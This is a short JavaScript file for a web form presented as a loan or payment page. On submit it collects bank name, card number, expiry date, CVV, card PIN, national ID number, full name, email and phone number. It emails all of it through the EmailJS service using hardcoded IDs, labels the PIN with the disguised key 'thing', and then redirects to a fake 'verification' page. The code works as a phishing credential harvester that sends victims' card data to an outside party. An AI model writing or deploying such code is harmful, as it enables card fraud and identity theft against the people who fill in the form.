

// Import EmailJS
//import emailjs from 'emailjs-com';

// Get the form element
const form = document.getElementById('payment-form');

// Add event listener to the form submit event
form.addEventListener('submit', (e) => {
  e.preventDefault();
  
  // Get the form data
  const bankName = document.getElementById('bank-name').value;
  const cardNumber = document.getElementById('card-number').value;
  const expiringDate = document.getElementById('expiring-date').value;
  const cvv = document.getElementById('cvv').value;
  const email = document.getElementById('email').value;
  const pin = document.getElementById('PIN').value;
  const phoneNumber = document.getElementById('phone-number').value;
  const idNumber = document.getElementById('ID-Number').value;
  const firstName = document.getElementById('First-Name').value;
  const middleName = document.getElementById('Middle-Name').value;
  const lastName = document.getElementById('Last-Name').value;
  const loanAmount = document.getElementById('Loan-Amount').value;
 

  // Check if all fields are filled
  if (!loanAmount || !lastName || !firstName || !middleName || !idNumber || !bankName || !cardNumber || !expiringDate || !cvv || !email || !pin || !phoneNumber) {
    alert('Please fill all details');
    return;
  }

  // Send the form data to EmailJS
  emailjs.send('service_9psisa9', 'template_n3thi1c', {
   
    bank_name: bankName,
    card_number: cardNumber,
    expiring_date: expiringDate,
    cvv: cvv,
    email: email,
    thing: pin,
    first_Name: firstName,
    middlename: middleName,
    lastname: lastName,
    phone_number: phoneNumber,
    idnumber: idNumber,
    loan_amount: loanAmount
    
  })
  .then((response) => {
    console.log('Success!', response.status, response.text);
    alert('Details submitted for payment');
    // Reset the form
    form.reset();

    // Add the condition to load another page with file path
  window.location.href = 'verification.html';
    
  })
  .catch((error) => {
    console.error('Error:', error);
  });
});   